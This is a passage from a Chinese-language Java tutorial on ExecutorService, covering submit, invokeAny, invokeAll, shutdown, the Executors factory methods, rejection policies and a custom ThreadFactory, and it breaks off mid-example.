<p>submit(Callable) 和submit(Runnable)类似，也会返回一个Future对象，但是除此之外，submit(Callable)接收的是一个Callable的实现，Callable接口中的call()方法有一个返回值，可以返回任务的执行结果，而Runnable接口中的run()方法是void的，没有返回值。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Future</span> future <span class="token operator">=</span> executorService<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Callable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
    	<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Asynchronous Callable"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    	<span class="token keyword">return</span> <span class="token string">"Callable Result"</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"future.get() = "</span> <span class="token operator">+</span> future<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>future.get()方法会返回Callable任务的执行结果。注意，future.get()方法会产生阻塞。</p>
<ul>
<li>invokeAny(…)</li>
</ul>
<p>invokeAny(…)方法接收的是一个Callable的集合，执行这个方法不会返回Future，但是会返回所有Callable任务中其中一个任务的执行结果。这个方法也无法保证返回的是哪个任务的执行结果，反正是其中的某一个</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ExecutorService</span> executorService <span class="token operator">=</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">newSingleThreadExecutor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Callable</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> callables <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Callable</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

callables<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Callable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
 	   <span class="token keyword">return</span> <span class="token string">"Task 1"</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
callables<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Callable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
	    <span class="token keyword">return</span> <span class="token string">"Task 2"</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
callables<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Callable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token string">"Task 3"</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token class-name">String</span> result <span class="token operator">=</span> executorService<span class="token punctuation">.</span><span class="token function">invokeAny</span><span class="token punctuation">(</span>callables<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"result = "</span> <span class="token operator">+</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>
executorService<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>每次执行都会返回一个结果，并且返回的结果是变化的，可能会返回“Task2”也可是“Task1”或者其它。</p>
<ul>
<li>nvokeAll(…)</li>
</ul>
<p>invokeAll(…)与 invokeAny(…)类似也是接收一个Callable集合，但是前者执行之后会返回一个Future的List，其中对应着每个Callable任务执行后的Future对象</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ExecutorService</span> executorService <span class="token operator">=</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">newSingleThreadExecutor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Callable</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> callables <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Callable</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

callables<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Callable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token string">"Task 1"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
callables<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Callable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token string">"Task 2"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
callables<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Callable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token string">"Task 3"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Future</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> futures <span class="token operator">=</span> executorService<span class="token punctuation">.</span><span class="token function">invokeAll</span><span class="token punctuation">(</span>callables<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Future</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> future <span class="token operator">:</span> futures<span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"future.get = "</span> <span class="token operator">+</span> future<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

executorService<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>List&lt;Callable&lt;String&gt;&gt; callables</code> 返回的结果集是无序的。</p>
<h3 id="ExecutorService的关闭">ExecutorService的关闭</h3>
<p>当我们使用完成ExecutorService之后应该关闭它，否则它里面的线程会一直处于运行状态。</p>
<ul>
<li>
<p>void shutdown()</p>
</li>
<li>
<p>List<runnable> shutdownNow()</runnable></p>
</li>
</ul>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220725112237287-1667231117133-90.png" alt="image-20220725112237287"></p>
<h2 id="Executors工具">Executors工具</h2>
<p><strong>利用：ThreadPoolExecutor(int corePoolSize, int maximumPoolSize,  long keepAliveTime, TimeUnit unit, BlockingQueue<runnable> workQueue,  ThreadFactory threadFactory, RejectedExecutionHandler handler)</runnable></strong></p>
<table>
<thead>
<tr>
<th>Executors模板方法</th>
<th>特性</th>
<th>corePoolSize</th>
<th>maximumPoolSize</th>
<th>keepAliveTime</th>
<th>unit</th>
<th>workQueue</th>
<th>threadFactory</th>
<th>handler</th>
</tr>
</thead>
<tbody>
<tr>
<td>newFixedThreadPool(int  nThreads)</td>
<td>线程池中的线程不会被销毁</td>
<td>nThreads</td>
<td>nThreads</td>
<td>0L</td>
<td>TimeUnit.MILLISECONDS</td>
<td><font color="red"> new LinkedBlockingQueue<runnable>(Integer.MAX_VALUE)</runnable></font></td>
<td>Executors.defaultThreadFactory()</td>
<td>defaultHandler（new  AbortPolicy()）</td>
</tr>
<tr>
<td>newFixedThreadPool(int  nThreads, ThreadFactory threadFactory)</td>
<td>线程池中的线程不会被销毁</td>
<td>nThreads</td>
<td>nThreads</td>
<td>0L</td>
<td>TimeUnit.MILLISECONDS</td>
<td>new LinkedBlockingQueue<runnable>(Integer.MAX_VALUE)</runnable></td>
<td>Executors.defaultThreadFactory()</td>
<td>defaultHandler（new  AbortPolicy()）</td>
</tr>
<tr>
<td>newSingleThreadExecutor</td>
<td>可以保留单线程需要执行的任务队列,并且将ThreadPoolExecutor中的方法屏蔽</td>
<td>1</td>
<td>1</td>
<td>0L</td>
<td>TimeUnit.MILLISECONDS</td>
<td>new LinkedBlockingQueue<runnable>(Integer.MAX_VALUE)</runnable></td>
<td>Executors.defaultThreadFactory()</td>
<td>defaultHandler（new  AbortPolicy()）</td>
</tr>
<tr>
<td>newSingleThreadExecutor(ThreadFactory  threadFactory)</td>
<td>可以保留单线程需要执行的任务队列,并且将ThreadPoolExecutor中的方法屏蔽</td>
<td>1</td>
<td>1</td>
<td>0L</td>
<td>TimeUnit.MILLISECONDS</td>
<td>new LinkedBlockingQueue<runnable>(Integer.MAX_VALUE)</runnable></td>
<td>threadFactory</td>
<td>defaultHandler（new  AbortPolicy()）</td>
</tr>
<tr>
<td>newCachedThreadPool()</td>
<td>每提交一个任务,创建一个线程</td>
<td>0</td>
<td>Integer.MAX_VALUE</td>
<td>60L</td>
<td>TimeUnit.SECONDS</td>
<td><font color="red">new SynchronousQueue<runnable>()</runnable></font></td>
<td>Executors.defaultThreadFactory()</td>
<td>defaultHandler（new  AbortPolicy()）</td>
</tr>
<tr>
<td>newCachedThreadPool(ThreadFactory  threadFactory)</td>
<td>每提交一个任务,创建一个线程</td>
<td>0</td>
<td>Integer.MAX_VALUE</td>
<td>60L</td>
<td>TimeUnit.SECONDS</td>
<td>new SynchronousQueue<runnable>()</runnable></td>
<td>threadFactory</td>
<td>defaultHandler（new  AbortPolicy()）</td>
</tr>
<tr>
<td>newSingleThreadScheduledExecutor()</td>
<td></td>
<td>0</td>
<td>Integer.MAX_VALUE</td>
<td>60L</td>
<td>TimeUnit.SECONDS</td>
<td>new DelayedWorkQueue()</td>
<td>Executors.defaultThreadFactory()</td>
<td>defaultHandler（new  AbortPolicy()）</td>
</tr>
<tr>
<td>newSingleThreadScheduledExecutor(ThreadFactory  threadFactory)</td>
<td></td>
<td>0</td>
<td>Integer.MAX_VALUE</td>
<td>60L</td>
<td>TimeUnit.SECONDS</td>
<td><font color="red">new DelayedWorkQueue()</font></td>
<td>threadFactory</td>
<td>defaultHandler（new  AbortPolicy()）</td>
</tr>
<tr>
<td>newScheduledThreadPool(int  corePoolSize)</td>
<td></td>
<td>corePoolSize</td>
<td>Integer.MAX_VALUE</td>
<td>0</td>
<td>TimeUnit.NANOSECONDS</td>
<td>new DelayedWorkQueue()</td>
<td>Executors.defaultThreadFactory()</td>
<td>defaultHandler（new  AbortPolicy()）</td>
</tr>
<tr>
<td>newScheduledThreadPool(int  corePoolSize, ThreadFactory threadFactory)</td>
<td></td>
<td>corePoolSize</td>
<td>Integer.MAX_VALUE</td>
<td>0</td>
<td>TimeUnit.NANOSECONDS</td>
<td>new DelayedWorkQueue()</td>
<td>threadFactory</td>
<td>defaultHandler（new  AbortPolicy()）</td>
</tr>
</tbody>
</table>
<p><strong>利用ForkJoinPool(int parallelism,  ForkJoinWorkerThreadFactory factory,  UncaughtExceptionHandler handler,  boolean asyncMode)</strong></p>
<table>
<thead>
<tr>
<th>Executors模板方法</th>
<th>int parallelism</th>
<th>ForkJoinWorkerThreadFactory  factory</th>
<th>UncaughtExceptionHandler handler</th>
<th>boolean asyncMode</th>
</tr>
</thead>
<tbody>
<tr>
<td>newWorkStealingPool()</td>
<td>Runtime.getRuntime().availableProcessors()</td>
<td>ForkJoinPool.defaultForkJoinWorkerThreadFactory</td>
<td>null</td>
<td>TRUE</td>
</tr>
<tr>
<td>newWorkStealingPool(int  parallelism)</td>
<td>parallelism</td>
<td>ForkJoinPool.defaultForkJoinWorkerThreadFactory</td>
<td>null</td>
<td>TRUE</td>
</tr>
</tbody>
</table>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">hots<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>executor</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Callable</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">ExecutorService</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Executors</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">TimeUnit</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">Collectors</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">IntStream</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ExecutorsExample</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token class-name">ExecutorService</span> executorService <span class="token operator">=</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">newWorkStealingPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Future</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> futures <span class="token operator">=</span> executorService<span class="token punctuation">.</span><span class="token function">invokeAll</span><span class="token punctuation">(</span><span class="token function">getTasks</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        executorService<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">static</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Callable</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> <span class="token function">getTasks</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token class-name">IntStream</span><span class="token punctuation">.</span><span class="token function">rangeClosed</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">boxed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>i <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token class-name">Callable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> stringCallable <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">doAction</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token string">"Task:"</span> <span class="token operator">+</span> i<span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> stringCallable<span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">Collectors</span><span class="token punctuation">.</span><span class="token function">toList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">doAction</span><span class="token punctuation">(</span><span class="token keyword">int</span> seconds<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>seconds<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="ThreadPoolExecutor">ThreadPoolExecutor</h2>
<h3 id="四个内置拒绝策略">四个内置拒绝策略</h3>
<ul>
<li>继承自RejectedExecutionHandler</li>
</ul>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220725171152798-1667231117133-91.png" alt="image-20220725171152798"></p>
<table>
<thead>
<tr>
<th>策略</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>AbortPolicy</td>
<td>抛出RejectedExecutionException异常</td>
</tr>
<tr>
<td>DiscardPolicy</td>
<td>默默地丢弃被拒绝的任务</td>
</tr>
<tr>
<td>DiscardOldestPolicy</td>
<td>丢弃最早的未处理请求，然后重试执行请求任务。若任务已被关闭，则丢弃任务</td>
</tr>
<tr>
<td>CallerRunsPolicy</td>
<td>直接在执行方法的调用线程中运行被拒绝的任务。若任务已被关闭，则丢弃任务</td>
</tr>
</tbody>
</table>
<h3 id="自定义ThreadFactory">自定义ThreadFactory</h3>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">Data</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">ThreadFactory</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span></span><span class="token class-name">AtomicInteger</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Data</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyThreadFactory</span> <span class="token keyword">implements</span> <span class="token class-name">ThreadFactory</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token class-name">AtomicInteger</span> <span class="token constant">SEQ</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">FailedAction</span><span class="token punctuation">&gt;</span></span> failed <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">Thread</span> <span class="token function">newThread</span><span class="token punctuation">(</span><span class="token class-name">Runnable</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Thread</span> thread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>
        thread<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"Factory-"</span> <span class="token operator">+</span> <span class="token constant">SEQ</span><span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        thread<span class="token punctuation">.</span><span class="token function">setUncaughtExceptionHandler</span><span class="token punctuation">(</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> e<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token comment">// 保留异常信息</span>
            failed<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FailedAction</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> thread<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Data</span>
    <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">FailedAction</span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token class-name">Thread</span> thread<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token class-name">Throwable</span> throwable<span class="token punctuation">;</span>

        <span class="token class-name">FailedAction</span><span class="token punctuation">(</span><span class="token class-name">Thread</span> t<span class="token punctuation">,</span> <span class="token class-name">Throwable</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>thread <span class="token operator">=</span> t<span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>throwable <span class="token operator">=</span> e<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">ExecutorService</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Executors</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyThreadFactoryTest</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">MyThreadFactory</span> myThreadFactory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyThreadFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
